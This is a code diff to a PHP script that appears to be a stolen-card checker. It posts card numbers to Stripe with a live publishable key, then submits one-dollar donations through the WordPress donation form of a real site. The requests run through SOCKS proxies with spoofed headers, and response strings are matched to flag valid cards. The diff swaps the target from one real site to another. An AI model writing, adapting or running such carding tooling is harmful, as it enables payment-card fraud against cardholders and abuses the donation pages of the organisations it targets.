@@ -348,7 +348,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=9d9c4264-4c31-4c8a-a72a-2ba669427656adcd18&sid=be2457e4-bbd6-44d3-a81c-6eabc15a78c09bf72a&pasted_fields=number&payment_user_agent=stripe.js%2F7f87617255%3B+stripe-js-v3%2F7f87617255%3B+card-element&referrer=https%3A%2F%2Fvoxel.guide&time_on_page=43023&key=pk_live_51NpwDuJJGU2OiPGJMg81F7vHVBhBfXEa9mIYDKKXzcMyrXj5sCu7v2SaHVV1wgAGC3Rqyyy5UFieTsOcngiuzE1H00R0fEcFLm');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=d83c799b-007c-4652-a7ac-12f01373339e7a0d8c&sid=5368db7a-93e0-411b-9c7d-73253282899b3b354d&pasted_fields=number&payment_user_agent=stripe.js%2F1a2719a8b8%3B+stripe-js-v3%2F1a2719a8b8%3B+card-element&referrer=https%3A%2F%2Fmarathonsailfish.com&time_on_page=53682&key=pk_live_51KMduYD6ccCBmaJ3rRrEgIuBzbrLOxeSt3iXNFAXGX1zCpb7O81NJLvyNdyGtRA391teuE99KQxtLN7X7ZwqMsf400mwUHsYqx');
 
 
 
@@ -359,7 +359,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://voxel.guide/wp-admin/admin-ajax.php?t=1712301129552');
+curl_setopt($ch, CURLOPT_URL, 'https://marathonsailfish.com/wp-admin/admin-ajax.php?t=1712389004872');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -370,22 +370,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1712301129552 h2',
-'Host: voxel.guide',
+'POST /wp-admin/admin-ajax.php?t=1712389004872 h2',
+'Host: marathonsailfish.com',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://voxel.guide',
+'origin: https://marathonsailfish.com',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://voxel.guide/donate/',
+'referer: https://marathonsailfish.com/donate/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1499%26_fluentform_3_fluentformnonce%3D3192d9ee41%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26gdpr-agreement%3Don%26ct_bot_detector_event_token%3D6d19867aab4bfd71bd0fed20be7ccbb93ee2fb912f4c7278002d8fefc4a790f2%26apbct_visible_fields%3DeyIwIjp7InZpc2libGVfZmllbGRzIjoibmFtZXNbZmlyc3RfbmFtZV0gbmFtZXNbbGFzdF9uYW1lXSBlbWFpbCBjdXN0b20tcGF5bWVudC1hbW91bnQiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6NCwiaW52aXNpYmxlX2ZpZWxkcyI6Il9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQgX2ZsdWVudGZvcm1fM19mbHVlbnRmb3Jtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBwYXltZW50X21ldGhvZCBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjZ9fQ%253D%253D%26__entry_intermediate_hash%3D2bce0e203742c6973fcf6b9b8e87577d%26ct_no_cookie_hidden_field%3D_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3RfdXJscyI6IntcInZveGVsLmd1aWRlL2RvbmF0ZS9cIjpbMTcxMjMwMTAzMl19IiwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiJTdCJTIydmlzaWJsZV9maWVsZHMlMjIlM0ElMjJuYW1lcyU1QmZpcnN0X25hbWUlNUQlMjBuYW1lcyU1Qmxhc3RfbmFtZSU1RCUyMGVtYWlsJTIwY3VzdG9tLXBheW1lbnQtYW1vdW50JTIyJTJDJTIydmlzaWJsZV9maWVsZHNfY291bnQlMjIlM0E0JTJDJTIyaW52aXNpYmxlX2ZpZWxkcyUyMiUzQSUyMl9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQlMjBfZmx1ZW50Zm9ybV8zX2ZsdWVudGZvcm1ub25jZSUyMF93cF9odHRwX3JlZmVyZXIlMjBwYXltZW50X21ldGhvZCUyMGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiUyMGFwYmN0X3Zpc2libGVfZmllbGRzJTIwX19lbnRyeV9pbnRlcm1lZGlhdGVfaGFzaCUyMGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQlMjIlMkMlMjJpbnZpc2libGVfZmllbGRzX2NvdW50JTIyJTNBOCU3RCIsImN0X2ZrcF90aW1lc3RhbXAiOiIxNzEyMzAxMDM2IiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzOTMlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMTMyMCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM5MyUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E3NDMlN0QiLCJjdF9jaGVja2pzIjoiMTIwNjI2MjUwMyIsImN0X3RpbWV6b25lIjoiNyIsImFwYmN0X3BpeGVsX3VybCI6Imh0dHBzJTNBJTJGJTJGbW9kZXJhdGUyLXY0LmNsZWFudGFsay5vcmclMkZwaXhlbCUyRjM2ZWI4MGU5NDEyNTdlYTc4ZTNmMDE5YWE3MDJkM2IxLmdpZiIsImN0X2NoZWNrZWRfZW1haWxzIjoiJTdCJTIyZ2xvb3Ntb2tlJTQwZ21haWwuY29tJTIyJTNBJTdCJTIycmVzdWx0JTIyJTNBJTIyQ0FDSEVEJTIyJTJDJTIydGltZXN0YW1wJTIyJTNBMTcxMjMwMTA0MyU3RCU3RCIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiY3RfcHNfdGltZXN0YW1wIjoiMTcxMjMwMTAzNiIsImFwYmN0X3BhZ2VfaGl0cyI6MiwiY3RfaGFzX2lucHV0X2ZvY3VzZWQiOiJ0cnVlIiwiYXBiY3Rfc2l0ZV9sYW5kaW5nX3RzIjoiMTcxMjMwMTAzMiIsImFwYmN0X2Nvb2tpZXNfdGVzdCI6IiU3QiUyMmNvb2tpZXNfbmFtZXMlMjIlM0ElNUIlMjJhcGJjdF90aW1lc3RhbXAlMjIlMkMlMjJhcGJjdF9zaXRlX2xhbmRpbmdfdHMlMjIlNUQlMkMlMjJjaGVja192YWx1ZSUyMiUzQSUyMmZiM2ExNTk3ZTU1ZTM0ZjBjOGIyNGEwZDQyMDkyYTM1JTIyJTdEIiwiY3RfcG9pbnRlcl9kYXRhIjoiJTVCJTVCMzgyJTJDMjgwJTJDMTUzNyU1RCUyQyU1QjQ2MCUyQzE2MiUyQzMxODklNUQlMkMlNUIyODQlMkMyMjQlMkM0NTcwJTVEJTJDJTVCNTI1JTJDMjI1JTJDNjA0MiU1RCUyQyU1QjYwMCUyQzE5NCUyQzcwMDAlNUQlMkMlNUIxNzUlMkM0OSUyQzk3NjElNUQlMkMlNUIyNjclMkM0NSUyQzI2NjAwJTVEJTJDJTVCNTI1JTJDMzAwJTJDNDM3NDElNUQlNUQiLCJhcGJjdF9pZnJhbWVzX3Byb3RlY3RlZCI6W10sImFwYmN0X3Nlc3Npb25faWQiOiJqYWRnaXJmciIsImFwYmN0X3NpdGVfcmVmZXJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3ZveGVsLmd1aWRlL2RvbmF0ZS8iLCJ0eXBvIjpbXX0%253D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2256%26_fluentform_7_fluentformnonce%3Dae248cc315%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10014%26address_1%255Bcountry%255D%3DUS%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D1.00%26payment_method%3Dstripe%26__entry_intermediate_hash%3D9a169a4c118a33891b02e8ae72237ffa%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=7');
 
 
 $result2 = curl_exec($ch);
@@ -408,7 +408,7 @@ if (
     strpos($result2, "Thank you for becoming a member") !== false ||
     strpos($result2, 'Membership confirmed.') !== false ||
     strpos($result2, 'Membership Confirmation') !== false ||
-    strpos($result2, 'true') !== false ||
+    strpos($result2, 'redirectUrl') !== false ||
     strpos($result2, 'incorrect_zip') !== false ||
     strpos($result2, 'Success ') !== false ||
     strpos($result2, '"type":"one-time"') !== false ||
